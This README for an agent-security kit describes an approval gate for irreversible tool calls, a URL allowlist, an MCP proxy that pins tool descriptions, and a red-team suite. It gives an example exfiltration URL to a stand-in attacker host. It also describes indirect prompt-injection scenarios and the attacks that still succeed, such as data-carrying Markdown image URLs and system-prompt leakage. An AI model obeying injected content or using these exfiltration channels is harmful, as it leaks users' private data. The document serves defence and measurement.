# Agents: MCP governance, approval of irreversible actions and red team

This directory holds the agent controls of the kit and the red team that measures them (backlog E7 and
E8). Everything here runs without a model or a key; the only dependencies are PyJWT and cryptography,
pinned in `pyproject.toml`.

## Controls

- `crfr_agents/approval.py` (E7.4). A tool is classified `read`, `write` or `irreversible`; a tool
  missing from the policy counts as irreversible. An irreversible call runs only with an approval token
  issued by a named person who saw the exact call. The token is an HMAC signed with a key the agent
  does not hold, bound to the agent, the tool and the SHA-256 of the canonical arguments, valid for at
  most one hour and usable once. The agent cannot approve its own action.
- `crfr_agents/destinations.py` (E7.4). A tool that takes a URL or an e-mail address declares which
  argument holds it and which hosts or domains it may reach: HTTPS only, exact host match, no user
  information in the URL, a single address per e-mail argument. Anything else is refused. This closes
  the exfiltration path of a read tool (`https://attacker.example/?d=<record>`), which approval alone
  does not cover.

These controls run where tool calls execute, in the MCP proxy below, not inside the model: an injected
instruction that convinces the model still cannot forge an approval.

## MCP governance (E8)

Agents reach MCP servers only through `crfr_agents/proxy.py`, at `/mcp/<server>`. For every JSON-RPC
message the proxy checks, in this order:

1. The agent's access token (`tokens.py`): RS256 or ES256 signature, issuer, expiry, subject, and an
   audience equal to the proxy's own resource URI, as RFC 8707 and the MCP authorization specification
   of 2026-07-28 require. A missing or wrong token gets a 401 with the `WWW-Authenticate` challenge of
   RFC 9728, which points to the protected resource metadata.
2. The server is in the private registry (`registry/servers.toml`) and in the agent's Rule of Two sheet.
3. On `tools/list`, every tool served matches the SHA-256 pinned for its name, description and input
   schema. A changed description, an extra tool or a missing tool blocks the server until a reviewed
   registry is loaded. A `tools/call` re-checks the list when the last check is older than one minute,
   so a server cannot change a description between two listings unnoticed.
4. On `tools/call`, the destination allowlist, then the approval gate: irreversible tools always, every
   tool when the sheet holds all three properties.
5. The call is forwarded with a credential the proxy mints for this agent and this server only (ES256,
   five minutes, audience the server's URI). The agent's own token is never forwarded.
6. Arguments and results go to a call log chained by HMAC (`calllog.py`); fields declared `sensitive`
   in the registry are written as a SHA-256 digest. `python -m crfr_agents verify-log` checks the chain.

Pin a server's tools after review with `python -m crfr_agents pin <server> tools.json`, which prints
the TOML block to paste into the registry.

### Rule of Two sheets

Each agentic workflow has a sheet in `workflows/` that declares which of the three properties of the
Agents Rule of Two it holds: [A] untrusted input, [B] access to sensitive systems or private data, [C]
state change or outside communication. A sheet that holds all three must declare
`oversight = "human-approval-all-actions"`, and the proxy then asks for an approval on every call.
`make mcp-check` refuses a sheet that holds three properties without that oversight, a sheet that
declares no [C] while its servers expose a write or irreversible tool, and a sheet that names a server
missing from the registry.

The demo server (`crfr_agents/demo.py`) and the tests cover the three blocking cases of E8.5: a changed
tool description, a server outside the registry and a token issued for another resource. The proxy is
a reference implementation for the controls; it does not serve SSE streams and runs as a single
process.

## Red team

| Layer | What | Where it runs |
|---|---|---|
| Gateway (E7.1) | 13 French attacks mapped to OWASP Top 10 for LLM 2025: personal data must reach Bedrock only as pseudonyms (LLM02), only inventory models and EU profiles (LLM03), size, output and identity limits (LLM10) | `make redteam`, e2e CI job, against the local stack |
| Indirect injection (E7.3) | 12 scenarios over four sectors: trapped documents, malicious tickets, poisoned tool descriptions | `make test-agents`, ci job |
| Live model (E7.1, E7.3) | promptfoo `owasp:llm` preset in French, and the 12 scenarios against a real model | `make redteam-live`, your credentials only |
| Scheduled (E7.2) | garak probes (latent injection, prompt injection) and PyRIT multi-turn scenarios | `.github/workflows/redteam.yml`, weekly |

### Attack success rate per version

The indirect injection bench assumes a fully compromised model: whatever the trapped content asks, the
model does. It then pushes that action through the controls and records whether the attacker's effect
happens. The rate is a property of the controls, not of the model. Without controls every attack
succeeds, which shows the bench can see a success. The published history is in
[`results/asr.md`](results/asr.md); a test fails when the published entry for the current version no
longer matches a fresh run, so a change to the scenarios or the controls must be published with
`make redteam-report`.

The attacks that still succeed are reported as such: content in the answer (a misleading statement, a
Markdown image whose URL carries data, the system prompt) and reversible writes. The kit has no control
on answer content; clients must not load remote images from model output, and reversible writes stay
logged and revertible.

### Live runs

`make redteam-live` uses your AWS credentials (`AWS_REGION=eu-west-3`). It sets
`PROMPTFOO_DISABLE_REMOTE_GENERATION`, so the attacks of the `owasp:llm` preset are generated by the
attacker model named in `evals/redteam/promptfooconfig.live.yaml`, and nothing is sent to promptfoo's
generation service. Plugins that need remote generation are then skipped; which ones has not been
checked yet. The indirect scenarios ask the model to answer in JSON, so a deterministic assertion sees
whether it acted on the attacked tool. `make redteam-selftest` (ci job) proves these assertions catch an
obedient agent and pass a refusing one.

### Scheduled garak and PyRIT

The workflow installs garak 0.17.1 and PyRIT 1.2.0 from hash-pinned locks in `scheduled/` (CPU-only
PyTorch), starts the local stack and runs `make redteam-scheduled`. Behind the local gateway sits the
fake Bedrock, which echoes the prompt: garak reports a 100 % success rate and one PyRIT scenario
succeeds. That run proves the harness and keeps the pinned tools working; it does not measure a model.
To measure one, run the same target against a gateway in front of Bedrock with `CRFR_GATEWAY` set and
the URI of `scheduled/garak-rest.json` changed. The demo user `redteam` has a raised daily quota so that
the probes do not hit the user quota.

Refresh the locks with the `uv pip compile` command written at the top of each file.
